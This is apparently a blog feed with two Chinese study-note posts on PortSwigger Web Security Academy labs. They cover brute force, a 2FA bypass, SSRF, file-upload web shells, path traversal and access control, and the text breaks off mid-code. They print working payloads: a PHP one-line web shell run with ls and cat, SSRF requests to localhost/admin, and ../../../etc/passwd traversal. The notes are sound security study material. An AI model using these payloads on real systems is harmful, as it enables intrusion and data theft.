<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>服务器漏洞之身份认证SSRF与文件上传漏洞</title>
      <link href="/blog/2026/09/16/20260916-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E%E4%B9%8B%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81SSRF%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/blog/2026/09/16/20260916-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E%E4%B9%8B%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81SSRF%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本篇整理自 PortSwigger Web Security Academy 的学习内容，覆盖身份认证漏洞（暴力破解、双因素认证绕过）、SSRF 两类攻击场景，以及文件上传漏洞与 Web Shell，附实操截图。</p></blockquote><h2 id="一、暴力破解攻击"><a href="#一、暴力破解攻击" class="headerlink" title="一、暴力破解攻击"></a>一、暴力破解攻击</h2><p>暴力破解攻击是指攻击者通过反复试验来猜测有效的用户凭证。这些攻击通常通过用户名和密码的单词列表进行自动化。通过自动化这一过程，尤其是使用专用工具，攻击者能够高速进行大量登录尝试。</p><p>暴力破解并不总是完全随机猜测用户名和密码。通过利用基本逻辑或公开知识，攻击者可以微调暴力破解攻击，做出更有根据的猜测，这大大提高了此类攻击的效率。依赖基于密码登录的唯一身份验证方式的网站，如果没有实施足够的暴力破解防护，可能会极易受到攻击。</p><h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p><strong>第一步：枚举用户名</strong></p><p>先随机输入用户名和密码，用 Burp 抓包。</p><p>抓取登录的 POST 请求发送到 Intruder，Sniper 模式下只给 username 参数的值加 <code>§</code> 标记，password 保留任意静态值。加载候选用户名字典后 Start attack。</p><p>攻击结束后按 <strong>Length 列</strong>排序，发现一条响应明显与其他不同。</p><p><img src="/blog/img/auth-ssrf-upload-1.png" alt="暴力破解实操（一）：Intruder 枚举用户名，按响应长度定位有效用户名"></p><p><strong>第二步：爆破密码</strong></p><p>Clear <code>§</code> 后固定用户名，改为给 password 参数加标记，字典换成候选密码列表，再次 Start attack。</p><p>攻击结束后看 <strong>Status 列</strong>。</p><p><img src="/blog/img/auth-ssrf-upload-2.png" alt="暴力破解实操（二）：Intruder 爆破密码，按状态码定位成功登录"></p><h2 id="二、绕过双因素认证"><a href="#二、绕过双因素认证" class="headerlink" title="二、绕过双因素认证"></a>二、绕过双因素认证</h2><p>有时，双因素认证（2FA）的实现存在缺陷，甚至可以被完全绕过。</p><p>如果用户先被要求输入密码，随后在<strong>另一个单独的页面上</strong>被要求输入验证码，那么在输入验证码之前，用户实际上就已经处于”已登录”状态了。这种情况下，值得测试一下：<strong>完成第一步认证（输完密码）后，能否直接跳转到”仅限登录后”的页面</strong>。偶尔你会发现，网站在加载这些页面前根本没有校验用户是否完成了第二步。</p><h3 id="实操：2FA-简单绕过"><a href="#实操：2FA-简单绕过" class="headerlink" title="实操：2FA 简单绕过"></a>实操：2FA 简单绕过</h3><p>输入目标账户和密码，发现存在二次认证。</p><p><img src="/blog/img/auth-ssrf-upload-3.png" alt="2FA 绕过实操（一）：完成密码认证后出现二次验证页面"></p><p>直接手动修改 URL 跳转到登录后的页面。</p><p><img src="/blog/img/auth-ssrf-upload-4.png" alt="2FA 绕过实操（二）：直接 URL 导向跳过验证码，成功进入登录后页面"></p><h2 id="三、SSRF：服务端请求伪造"><a href="#三、SSRF：服务端请求伪造" class="headerlink" title="三、SSRF：服务端请求伪造"></a>三、SSRF：服务端请求伪造</h2><h3 id="什么是-SSRF"><a href="#什么是-SSRF" class="headerlink" title="什么是 SSRF"></a>什么是 SSRF</h3><p>服务端请求伪造（Server-side request forgery，SSRF）是一种 Web 安全漏洞，允许攻击者<strong>诱使服务端应用向非预期的位置发起请求</strong>。</p><p>在典型的 SSRF 攻击中，攻击者可能让服务器去连接<strong>组织内部基础设施中仅限内网访问的服务</strong>；在另一些情况下，攻击者还能强制服务器连接<strong>任意的外部系统</strong>，从而泄露敏感数据，比如认证凭据。</p><p>简单来说，如果这个服务器有某些文件下载传输功能（服务器一般一只脚在内网，一只脚在外网），攻击者可以让服务器访问内网里的地址。因为服务器在内网里一般是畅通的，攻击者可以借助服务器在内网的访问得到数据。</p><h3 id="针对服务器本机的-SSRF"><a href="#针对服务器本机的-SSRF" class="headerlink" title="针对服务器本机的 SSRF"></a>针对服务器本机的 SSRF</h3><p>在针对服务器的 SSRF 攻击中，攻击者使应用程序通过环回网络接口向托管该应用的服务器发送 HTTP 请求。这通常涉及提供一个带有如下主机名的 URL：<code>127.0.0.1</code>（指向环回适配器的预留 IP 地址）或 <code>localhost</code>（同一适配器常用的名称）。</p><p>例如，想象一个购物应用，允许用户查看某商品在某家门店是否有库存。为了提供库存信息，应用程序必须查询各种后端 REST API。它通过前端 HTTP 请求将 URL 传递给相关的后端 API 端点来实现这一点。当用户查看某项商品的库存状态时，浏览器会发出以下请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/product/stock</span> <span class="hljs-meta">HTTP/1.0</span><br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>118<br><br><span class="language-apache"><span class="hljs-attribute">stockApi</span>=http://stock.weliketoshop.net:<span class="hljs-number">8080</span>/product/stock/check%<span class="hljs-number">3</span>FproductId%<span class="hljs-number">3</span>D6%<span class="hljs-number">26</span>storeId%<span class="hljs-number">3</span>D1</span><br></code></pre></td></tr></table></figure><p>这会导致服务器向指定的 URL 发送请求，获取库存状态，并返回给用户。</p><p>在这个例子中，攻击者可以修改请求，指定服务器本地的 URL：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/product/stock</span> <span class="hljs-meta">HTTP/1.0</span><br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>118<br><br><span class="language-freedesktop"><span class="hljs-attr">stockApi</span><span class="hljs-operator">=</span>http://localhost/admin</span><br></code></pre></td></tr></table></figure><p>服务器会获取 <code>/admin</code> 的内容并将其返回给用户。</p><p>攻击者通常也可以直接访问 <code>/admin</code>，但管理功能一般只对已认证用户开放，这意味着攻击者看不到任何有价值的东西。然而，如果对 <code>/admin</code> 的请求<strong>来自本机</strong>，常规的访问控制就会被绕过：应用程序授予对管理功能的完全访问权限，因为请求看起来来自可信位置。</p><p>应用为什么会这样表现——<strong>默认信任来自本机的请求</strong>？可能出于多种原因：</p><ol><li><strong>访问控制检查在另一个组件里。</strong> 这个组件位于应用服务器之前（比如反向代理）。当请求”绕回”服务器自身时（连接直接打到应用服务器，不再经过前置组件），检查就被跳过了。</li><li><strong>灾难恢复预留的后门。</strong> 为了容灾，应用可能允许<strong>从本机发起的连接不经登录直接获得管理权限</strong>——万一管理员丢了凭据，还能从服务器上登进系统自救。这个设计的前提假设是：<strong>只有完全可信的人才会直接从服务器本机发起连接</strong>。</li><li><strong>管理接口监听在不同端口上。</strong> 管理接口可能跑在主应用之外的另一个端口，用户根本无法直接访问到它。</li></ol><p>这种<strong>信任关系</strong>——来自本机的请求被区别对待、优于普通请求——往往使 SSRF 成为<strong>严重（critical）级别的漏洞</strong>。</p><h3 id="实操：本机-SSRF"><a href="#实操：本机-SSRF" class="headerlink" title="实操：本机 SSRF"></a>实操：本机 SSRF</h3><p><img src="/blog/img/auth-ssrf-upload-5.png" alt="SSRF 实操（一）：库存查询接口将用户可控的 stockApi 参数交给服务端请求"></p><p>将 stockApi 参数改为 <code>http://localhost/admin</code>，在返回的管理界面里找到了 <code>delete?username=carlos</code> 这样的删除用户接口。</p><p><img src="/blog/img/auth-ssrf-upload-6.png" alt="SSRF 实操（二）：通过本机请求访问 /admin，绕过访问控制"></p><h3 id="针对其他后端系统的-SSRF"><a href="#针对其他后端系统的-SSRF" class="headerlink" title="针对其他后端系统的 SSRF"></a>针对其他后端系统的 SSRF</h3><p>在某些情况下，应用服务器能够与一些<strong>用户无法直接访问到的后端系统</strong>交互。这些系统通常使用<strong>不可路由的私有 IP 地址</strong>。后端系统一般由<strong>网络拓扑结构</strong>保护着，因此它们的安全防护往往<strong>更薄弱</strong>。很多时候，内部后端系统包含敏感功能，<strong>任何能与之交互的人都可以不经认证直接访问</strong>。</p><p>在前面的例子中，假设某个后端地址 <code>http://192.168.0.68/admin</code> 上有一个管理接口。攻击者可以提交以下请求来利用 SSRF 漏洞，访问该管理接口：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/product/stock</span> <span class="hljs-meta">HTTP/1.0</span><br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>118<br><br><span class="language-freedesktop"><span class="hljs-attr">stockApi</span><span class="hljs-operator">=</span>http://192.168.0.68/admin</span><br></code></pre></td></tr></table></figure><h3 id="实操：内网扫描"><a href="#实操：内网扫描" class="headerlink" title="实操：内网扫描"></a>实操：内网扫描</h3><p>利用 Intruder 对 <code>192.168.0.X:8080</code> 网段进行爆破，找到异常响应，扫出存活主机 <code>192.168.0.155:8080</code>。</p><p><img src="/blog/img/auth-ssrf-upload-7.png" alt="内网 SSRF 实操（一）：Intruder 扫描内网网段，按响应长度区分存活主机"></p><p><img src="/blog/img/auth-ssrf-upload-8.png" alt="内网 SSRF 实操（二）：在扫出的 192.168.0.155:8080 上发现管理接口"></p><blockquote><p><strong>两种 SSRF 的信任来源略有区别：</strong></p><p>第一种信任原因是请求来自本机（<code>127.0.0.1</code> 或 <code>localhost</code>）；</p><p>第二种信任原因是内网本身不设防，默认连接到内网的是可信的。</p></blockquote><h2 id="四、文件上传漏洞"><a href="#四、文件上传漏洞" class="headerlink" title="四、文件上传漏洞"></a>四、文件上传漏洞</h2><h3 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h3><p>文件上传漏洞是指 Web 服务器允许用户向其文件系统上传文件，却<strong>没有充分验证文件的名称、类型、内容或大小</strong>。如果不能正确执行这些限制，哪怕只是一个基础的图片上传功能，也可能被用来上传<strong>任意甚至危险的文件</strong>——包括能在服务端执行的脚本文件，从而实现<strong>远程代码执行（RCE）</strong>。</p><p>在某些情况下，<strong>上传这个动作本身就足以造成危害</strong>；另一些攻击则需要<strong>后续发起一个针对该文件的 HTTP 请求</strong>，通常是为了触发服务器执行它。</p><blockquote><p>此类漏洞在 CTF 中是十分常见的题型。</p></blockquote><h3 id="文件上传漏洞是如何产生的"><a href="#文件上传漏洞是如何产生的" class="headerlink" title="文件上传漏洞是如何产生的"></a>文件上传漏洞是如何产生的</h3><p>考虑到文件上传的危险显而易见，真实网站里<strong>完全没有任何限制</strong>的情况很少见。更常见的情况是：开发者实现了一套<strong>自以为健壮的验证，但它要么本身就有缺陷，要么很容易被绕过</strong>。</p><p>例如，开发者可能尝试用<strong>黑名单</strong>拦截危险的文件类型，但在检查文件扩展名时<strong>没有考虑到解析差异</strong>；而且和任何黑名单一样，很容易<strong>遗漏一些更冷门但依然危险的文件类型</strong>。</p><p>另一些情况下，网站会通过验证某些<strong>属性</strong>来判断文件类型——而这些属性可以被攻击者用 Burp Proxy、Repeater 之类的工具<strong>轻易篡改</strong>。</p><p>最终，即使是健壮的验证措施，也可能在构成网站的<strong>多台主机、多个目录之间执行得不一致</strong>，由此产生的<strong>差异（discrepancy）</strong>就可以被利用。</p><p>文件上传漏洞有以下几类：</p><p><img src="/blog/img/auth-ssrf-upload-9.png" alt="文件上传漏洞的分类"></p><h3 id="文件类型验证的缺陷（Flawed-file-type-validation）"><a href="#文件类型验证的缺陷（Flawed-file-type-validation）" class="headerlink" title="文件类型验证的缺陷（Flawed file type validation）"></a>文件类型验证的缺陷（Flawed file type validation）</h3><p>普通表单用 <code>application/x-www-form-urlencoded</code>（纯文本编码），传不了二进制数据；文件上传必须用 **<code>multipart/form-data</code>**，请求体被 boundary（边界线）切分成多个格子，每格一个表单字段：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span>: multipart/form-data;boundary=----<span class="hljs-title class_">WebKitFormBoundaryXg7TvA8b9mKpL2qN</span><br>------<span class="hljs-title class_">WebKitFormBoundaryXg7TvA8b9mKpL2qN</span><br><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Disposition</span>: form-data; name=<span class="hljs-string">&quot;avatar&quot;</span>; filename=<span class="hljs-string">&quot;cat.png&quot;</span>   ← 文件名声明<br><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span>: image/png    ← 类型声明<br>[二进制内容]<br><br>------<span class="hljs-title class_">WebKitFormBoundaryXg7TvA8b9mKpL2qN</span><br><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Disposition</span>: form-data; name=<span class="hljs-string">&quot;user&quot;</span><br>wiener<br>------<span class="hljs-title class_">WebKitFormBoundaryXg7TvA8b9mKpL2qN</span>--<br></code></pre></td></tr></table></figure><p><strong><code>filename</code>、<code>Content-Type</code>、文件内容，全部由发送方填写。</strong></p><h4 id="三个字段"><a href="#三个字段" class="headerlink" title="三个字段"></a>三个字段</h4><table><thead><tr><th>字段</th><th>起作用的阶段</th><th>决定什么</th></tr></thead><tbody><tr><td>Content-Type</td><td>只在上传检查时</td><td>门卫放不放</td></tr><tr><td>filename（扩展名）</td><td>存储 + 执行时</td><td>服务器<strong>怎么对待</strong>这个文件（是否当代码执行）</td></tr><tr><td>内容</td><td>执行时</td><td>执行后<strong>发生什么</strong></td></tr></tbody></table><h3 id="网站的验证手法与绕过"><a href="#网站的验证手法与绕过" class="headerlink" title="网站的验证手法与绕过"></a>网站的验证手法与绕过</h3><p><strong>① 谎报 Content-Type</strong>：服务器只信请求里声明的 <code>image/jpeg</code>。</p><p><strong>② 解析差异 &#x2F; 漏网扩展名</strong>：<code>.php</code> 被拦了，还有 <code>.php5</code>、<code>.phtml</code>、<code>.phar</code>。</p><p><strong>③ 图片马</strong>：服务器检查文件头字节（PNG 是 <code>89 50 4E 47</code>），那就拼一个”真图片头 + 尾部 PHP 代码”的合成文件。</p><h3 id="Web-Shell-与一句话木马"><a href="#Web-Shell-与一句话木马" class="headerlink" title="Web Shell 与一句话木马"></a>Web Shell 与一句话木马</h3><p>文件上传漏洞中危害最大的是 Web Shell（网页木马），最简单的形式是一句话木马。</p><p>网站允许你上传<strong>服务端脚本</strong>（如 PHP、Java、Python 文件），<strong>并且服务器配置为把它们当代码执行</strong>。这种情况下，在服务器上创建自己的 Web Shell 就是轻而易举的事。</p><p><strong>Web Shell（网页木马）</strong>：一种恶意脚本，攻击者只需<strong>向正确的端点发送 HTTP 请求</strong>，就能在远程 Web 服务器上<strong>执行任意命令</strong>。</p><p>如果成功上传了 Web Shell，你就<strong>实际上完全控制了服务器</strong>——可以读写任意文件、窃取敏感数据，甚至<strong>以这台服务器为跳板</strong>攻击内部基础设施和网络外的其他服务器。</p><p>例如，下面这个 PHP 单行代码可以读取服务器文件系统中的任意文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/path/to/target/file&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上传后，只要请求这个恶意文件，目标文件的内容就会出现在响应里。</p><p>一个更通用的 Web Shell 长这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;command&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>$_GET[&#39;command&#39;]</code>：从 URL 查询参数里取值——<strong>命令是攻击者现场指定的</strong>；</li><li><code>system()</code>：PHP 内置函数，把字符串当<strong>操作系统命令</strong>执行，返回输出；</li><li><code>echo</code>：把命令输出回显到 HTTP 响应里。</li></ul><p>访问 <code>exploit.php?command=id</code> 时，服务器实际执行的是 <code>id</code>（Linux 命令，显示当前用户身份），输出直接回到你的浏览器。把 <code>command</code> 换成 <code>cat /etc/passwd</code>、<code>ls /</code>、<code>whoami</code>……<strong>整个服务器的命令行就在你的地址栏里了</strong>。</p><h3 id="实操：一句话木马"><a href="#实操：一句话木马" class="headerlink" title="实操：一句话木马"></a>实操：一句话木马</h3><p>创建 PHP 文件并上传：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;command&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>通过 Linux 指令列目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /files/avatars/php-lab1.php?<span class="hljs-built_in">command</span>=<span class="hljs-built_in">ls</span>+/home/carlos/secret HTTP/2<br></code></pre></td></tr></table></figure><blockquote><p>原指令是 <code>GET /files/avatars/php-lab1.php?command=ls /home/carlos/secret HTTP/2</code>，但在 URL 里空格需要转义。两种写法：</p><p><code>%20</code> 是空格的 URL 编码；<code>+</code> 在查询参数里等效。</p></blockquote><p><img src="/blog/img/auth-ssrf-upload-10.png" alt="Web Shell 实操（一）：上传 PHP 一句话木马，用 ls 命令列出目标目录"></p><p>查看文件内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /files/avatars/php-lab1.php?<span class="hljs-built_in">command</span>=<span class="hljs-built_in">cat</span>%20/home/carlos/secret HTTP/2<br></code></pre></td></tr></table></figure><p><img src="/blog/img/auth-ssrf-upload-11.png" alt="Web Shell 实操（二）：cat 读取 /home/carlos/secret 文件内容"></p><p>因为 <code>system</code> 和 <code>echo</code> 的原因，答案会输出两次。</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> PortSwigger </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务器漏洞之目录遍历与访问控制</title>
      <link href="/blog/2026/09/15/20260915-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E%E4%B9%8B%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E4%B8%8E%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/"/>
      <url>/blog/2026/09/15/20260915-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E%E4%B9%8B%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E4%B8%8E%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本篇整理自 PortSwigger Web Security Academy 的学习内容，覆盖路径穿越与访问控制两类漏洞，附实操截图。</p></blockquote><h2 id="一、路径穿越（Path-Traversal）"><a href="#一、路径穿越（Path-Traversal）" class="headerlink" title="一、路径穿越（Path Traversal）"></a>一、路径穿越（Path Traversal）</h2><p>路径穿越也称路径遍历。以下内容来自 PortSwigger。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>设想一个购物应用，显示待售商品图片，可能会加载使用以下 HTML 的图片：</p><p><code>&lt;img src=&quot;/loadImage?filename=218.png&quot;&gt;</code></p><p>该 URL 会接收参数并返回指定文件的内容。图片文件存储在磁盘上，为了返回图片，应用程序将请求的文件名附加到基础目录，并使用文件系统 API 读取文件内容。换句话说，应用程序读取的文件路径是：</p><p><code>/var/www/images/218.png</code></p><p>该应用没有实现针对路径穿越攻击的防御措施，因此攻击者可以请求如下 URL，从服务器文件系统中获取任意文件：</p><p><code>https://insecure-website.com/loadImage?filename=../../../etc/passwd</code></p><p>这会导致应用程序从以下文件路径读取：</p><p><code>/var/www/images/../../../etc/passwd</code></p><p><code>../</code> 序列在文件路径内有效，意味着在目录结构中向上提升一层。这三个连续序列从文件系统根节点逐步提升，因此实际被读取的文件是：</p><p><code>/etc/passwd</code></p><p>在基于 Unix 的操作系统中，这是一个标准文件，包含服务器上注册用户的详细信息，但攻击者也可以用同样的方法获取其他任意文件。</p><p>在 Windows 上，<code>..\</code> 和 <code>../</code> 都是有效的目录遍历序列。以下是针对 Windows 服务器的等效攻击示例：</p><p><code>https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini</code></p><h3 id="如何发现"><a href="#如何发现" class="headerlink" title="如何发现"></a>如何发现</h3><ul><li>URL 参数如 <code>?filename=218.png</code>、<code>?file=report.pdf</code>、<code>?path=/uploads/a.jpg</code></li><li>URL 中出现 <code>/static/...</code>、<code>/download/...</code>、<code>/loadImage?...</code> 这类”读资源”的端点</li><li>页面上有下载链接、头像、附件、图片等由后端读取本地文件返回的功能</li></ul><h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p>根据前端给出的图片源可发现网站路径，点击后进入路径图片。</p><p><img src="/blog/img/server-vuln-1.png" alt="路径穿越实操：根据前端图片源发现网站路径"></p><p>将网址参数改为 <code>?filename=../../../etc/passwd</code>，即可得到服务器上的目标文件。</p><h2 id="二、访问控制（Access-Control）"><a href="#二、访问控制（Access-Control）" class="headerlink" title="二、访问控制（Access Control）"></a>二、访问控制（Access Control）</h2><p>以下内容来自 PortSwigger。</p><h3 id="什么是访问控制"><a href="#什么是访问控制" class="headerlink" title="什么是访问控制"></a>什么是访问控制</h3><p>访问控制是对”谁或什么”有权执行操作或访问资源施加约束。在 Web 应用中，访问控制依赖于身份认证和会话管理：</p><ul><li><strong>身份认证（Authentication）</strong>：确认用户是他们声称的那个人。</li><li><strong>会话管理（Session management）</strong>：识别后续哪些 HTTP 请求来自同一个用户。</li><li><strong>访问控制（Access control）</strong>：决定该用户是否被允许执行他正试图执行的操作。</li></ul><p>三者各司其职：身份认证确认是否登录；会话管理通过 cookie 和 session 确认当前会话属于谁；访问控制的逻辑判断是否有权限使用。</p><p>访问控制失效（Broken access control）很常见，而且往往构成严重的安全漏洞。访问控制的设计和管理是一个复杂且动态的问题，需要把业务、组织、法律上的约束落实到技术实现中。访问控制的设计决策必须由人来做出，所以出错的可能性很高。</p><h3 id="垂直越权（Vertical-privilege-escalation）"><a href="#垂直越权（Vertical-privilege-escalation）" class="headerlink" title="垂直越权（Vertical privilege escalation）"></a>垂直越权（Vertical privilege escalation）</h3><p>如果用户能够访问其本不被允许访问的功能，这就是垂直越权。例如，一个非管理员用户能够进入管理员页面并删除用户账号，这就是垂直越权。</p><h3 id="未加防护的功能（Unprotected-functionality）"><a href="#未加防护的功能（Unprotected-functionality）" class="headerlink" title="未加防护的功能（Unprotected functionality）"></a>未加防护的功能（Unprotected functionality）</h3><p>最基本的情况是：应用对敏感功能完全没有实施任何保护。比如，管理功能可能只在管理员自己的欢迎页面上有链接，而普通用户的页面上没有。但普通用户仍可能通过直接浏览管理功能的 URL 来访问它。</p><p>例如，某网站把敏感功能放在这样的 URL 上：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//insecure-website.com/admin</span><br></code></pre></td></tr></table></figure><p>这个页面可能任何用户都能访问，而不仅仅是那些界面上有链接的管理员。有时管理 URL 还会在其他地方泄露，比如 robots.txt：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//insecure-website.com/robots.txt</span><br></code></pre></td></tr></table></figure><p>即使 URL 没在任何地方泄露，攻击者也可以用字典对敏感功能的位置进行爆破。</p><p><strong>实操</strong></p><p>通过网址的反爬虫目录得到禁止页面，发现可以垂直越权。</p><p><img src="/blog/img/server-vuln-2.png" alt="垂直越权实操：通过反爬虫目录发现禁止页面"></p><p><img src="/blog/img/server-vuln-3.png" alt="垂直越权实操：访问被隐藏的管理页面"></p><h3 id="隐晦式安全：隐藏-URL-不等于防护"><a href="#隐晦式安全：隐藏-URL-不等于防护" class="headerlink" title="隐晦式安全：隐藏 URL 不等于防护"></a>隐晦式安全：隐藏 URL 不等于防护</h3><p>在某些情况下，敏感功能会通过一个不太可能被猜到的 URL 来隐藏。这就是所谓的”<strong>隐晦式安全（security by obscurity）</strong>“。然而，隐藏敏感功能并不能提供有效的访问控制，因为用户可能通过多种途径发现这个被混淆的 URL。</p><p>设想一个应用把管理功能放在这样的 URL 上：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//insecure-website.com/administrator-panel-yb556</span><br></code></pre></td></tr></table></figure><p>攻击者可能无法直接猜出这个地址。但应用仍然可能把 URL 泄露给用户。比如，URL 可能出现在根据用户角色构建界面的 JavaScript 里：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">var</span> isAdmin = <span class="hljs-literal">false</span>;</span><br><span class="language-javascript"><span class="hljs-keyword">if</span> (isAdmin) &#123;...</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> adminPanelTag = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;a&#x27;</span>);</span><br><span class="language-javascript">adminPanelTag.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&#x27;href&#x27;</span>, <span class="hljs-string">&#x27;https://insecure-website.com/administrator-panel-yb556&#x27;</span>);</span><br><span class="language-javascript">adminPanelTag.<span class="hljs-property">innerText</span> = <span class="hljs-string">&#x27;Admin panel&#x27;</span>;...&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这段脚本的作用是：如果用户是管理员，就在界面上添加一个指向管理面板的链接。<strong>但问题是：包含该 URL 的脚本本身，对所有用户都是可见的，与角色无关。</strong></p><blockquote><p>我的理解：服务器在渲染时对普通用户 <code>isAdmin=false</code>，页面上看不到入口，但前端 JS 里会把这个 URL 暴露出来。</p></blockquote><p><strong>实操</strong></p><p><img src="/blog/img/server-vuln-4.png" alt="隐晦式安全实操（一）：从前端 JS 中发现隐藏管理面板"></p><p><img src="/blog/img/server-vuln-5.png" alt="隐晦式安全实操（二）：直接访问隐藏管理面板"></p><h3 id="基于参数的访问控制"><a href="#基于参数的访问控制" class="headerlink" title="基于参数的访问控制"></a>基于参数的访问控制</h3><p>有些应用在用户登录时就确定了其访问权限或角色，然后把这条信息存储在一个<strong>用户可控的位置</strong>，可能是：</p><ul><li>隐藏字段（hidden field）</li><li>Cookie</li><li>预设的查询字符串参数</li></ul><p>应用根据提交上来的值做访问控制决策。例如：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">https://insecure-website.com/<span class="hljs-keyword">login</span>/home.jsp?<span class="hljs-keyword">admin</span>=<span class="hljs-keyword">true</span><br>https://insecure-website.com/<span class="hljs-keyword">login</span>/home.jsp?<span class="hljs-keyword">role</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>这种方式是不安全的，因为用户可以修改这个值，从而访问自己本无权使用的功能，比如管理功能。</p><p>应用<strong>做了</strong>权限判断——但判断的依据存错了地方。权限信息本该存在<strong>服务端</strong>（Session 里），却被放在了<strong>请求里随用户来回传</strong>。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 